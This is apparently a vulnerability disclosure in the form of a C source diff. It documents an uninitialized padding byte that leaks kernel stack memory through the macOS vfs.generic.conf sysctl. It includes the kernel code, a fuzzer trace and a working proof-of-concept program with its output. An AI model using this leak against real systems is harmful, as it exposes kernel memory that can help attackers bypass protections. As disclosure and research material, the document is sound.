@@ -1,0 +1,134 @@
+/*
+The sysctls vfs.generic.conf.* are handled by sysctl_vfs_generic_conf(), which is implemented as follows:
+
+static int
+sysctl_vfs_generic_conf SYSCTL_HANDLER_ARGS
+{
+        int *name, namelen;
+        struct vfstable *vfsp;
+        struct vfsconf vfsc;
+        
+        (void)oidp;
+        name = arg1;
+        namelen = arg2;
+        
+        [check for namelen==1]
+                        
+        mount_list_lock();
+        for (vfsp = vfsconf; vfsp; vfsp = vfsp->vfc_next)
+                if (vfsp->vfc_typenum == name[0])
+                        break;
+        
+        if (vfsp == NULL) {
+                mount_list_unlock();
+                return (ENOTSUP);
+        }
+                        
+        vfsc.vfc_reserved1 = 0;
+        bcopy(vfsp->vfc_name, vfsc.vfc_name, sizeof(vfsc.vfc_name));
+        vfsc.vfc_typenum = vfsp->vfc_typenum;
+        vfsc.vfc_refcount = vfsp->vfc_refcount;
+        vfsc.vfc_flags = vfsp->vfc_flags;
+        vfsc.vfc_reserved2 = 0;
+        vfsc.vfc_reserved3 = 0;
+                        
+        mount_list_unlock();
+        return (SYSCTL_OUT(req, &vfsc, sizeof(struct vfsconf)));
+}
+
+`struct vfsconf` is defined as follows:
+
+struct vfsconf {
+        uint32_t vfc_reserved1;         /* opaque 
+        char    vfc_name[MFSNAMELEN];   /* filesystem type name 
+        int     vfc_typenum;            /* historic filesystem type number 
+        int     vfc_refcount;           /* number mounted of this type 
+        int     vfc_flags;              /* permanent flags 
+        uint32_t vfc_reserved2;         /* opaque 
+        uint32_t vfc_reserved3;         /* opaque 
+};
+
+`MFSNAMELEN` is defined as follows:
+
+#define MFSNAMELEN      15      /* length of fs type name, not inc. null 
+#define MFSTYPENAMELEN  16      /* length of fs type name including null 
+
+This means that one byte of uninitialized padding exists between `vfc_name` and `vfc_typenum`.
+
+
+This issue was discovered using an AFL-based fuzzer, loosely based on TriforceAFL. This is the diff of two runs over the fuzzer queue with different stack poison values (0xcc and 0xdd):
+
+--- traces_cc_/id:018803,src:012522,op:havoc,rep:2,+cov 2017-11-06 13:08:41.486752415 +0100
++++ traces_dd_/id:018803,src:012522,op:havoc,rep:2,+cov 2017-11-06 13:08:56.583413293 +0100
+@@ -1,19 +1,19 @@
+ loaded 72 bytes fuzzdata
+ USER READ: addr 0xffffffffffffffff, size 8, value 0x00000600020000ca
+ USER READ: addr 0xffffffffffffffff, size 8, value 0x0000000000000003
+ USER READ: addr 0xffffffffffffffff, size 8, value 0x0000000000000004
+ USER READ: addr 0xffffffffffffffff, size 8, value 0x0000000000060000
+ USER READ: addr 0xffffffffffffffff, size 8, value 0x00ea800500000010
+ USER READ: addr 0xffffffffffffffff, size 8, value 0x0000000000010003
+ USER READ: addr 0xffffffffffffffff, size 8, value 0x0000000000000000
+ syscall(rax=0x600020000ca, args=[0x3, 0x4, 0x60000, 0xea800500000010, 0x10003, 0x0]); rsp=0x7ffee418eda8
+ USER READ: addr 0x3, size 8, value 0x0000000000000003
+ USER READ: addr 0xb, size 8, value 0x0000001700000002
+ USER WRITE: addr 0x60000, size 8, value 0x0073666800000000
+ USER WRITE: addr 0x60008, size 8, value 0x0000000000000000
+-USER WRITE: addr 0x60010, size 8, value 0x00000017cc000000
++USER WRITE: addr 0x60010, size 8, value 0x00000017dd000000
+ USER WRITE: addr 0x60018, size 8, value 0x0000100000000001
+ USER WRITE: addr 0x60020, size 8, value 0x0000000000000000
+ sysret
+ OUT OF FUZZER INPUT DATA - REWINDING
+ REWIND! (trigger_exception=0x10006; cycles=7)
+
+Verified on a Macmini7,1 running macOS 10.13 (17A405), Darwin 17.0.0:
+
+$ cat sysctl_conf_test.c
+*/
+
+#include <stdlib.h>
+#include <err.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/sysctl.h>
+#include <sys/mount.h>
+
+struct vfsconf_withpad {
+  int reserved1;
+  char name[15];
+  unsigned char pad1;
+  int typenum;
+  int refcount;
+  int flags;
+  int reserved2;
+  int reserved3;
+};
+
+int main(void) {
+  int name[] = { CTL_VFS, VFS_GENERIC, VFS_CONF, 0x17 };
+  static struct vfsconf_withpad conf;
+  size_t outlen = sizeof(conf);
+  if (sysctl(name, sizeof(name)/sizeof(name[0]), &conf, &outlen, NULL, 0))
+    err(1, "sysctl");
+  if (outlen != sizeof(conf))
+    errx(1, "outlen != sizeof(conf)");
+  printf("name=%.15s pad1=0x%02hhx typenum=%d refcount=%d flags=%d\n",
+      conf.name, conf.pad1, conf.typenum, conf.refcount, conf.flags);
+}
+
+/*
+$ gcc -o sysctl_conf_test sysctl_conf_test.c -Wall
+$ ./sysctl_conf_test
+name=hfs pad1=0x24 typenum=23 refcount=2 flags=4096
+$ ./sysctl_conf_test
+name=hfs pad1=0x26 typenum=23 refcount=2 flags=4096
+$ ./sysctl_conf_test
+name=hfs pad1=0x24 typenum=23 refcount=2 flags=4096
+$ ./sysctl_conf_test
+name=hfs pad1=0x23 typenum=23 refcount=2 flags=4096
+$ ./sysctl_conf_test
+name=hfs pad1=0x23 typenum=23 refcount=2 flags=4096
+$ ./sysctl_conf_test
+name=hfs pad1=0x26 typenum=23 refcount=2 flags=4096
+*/
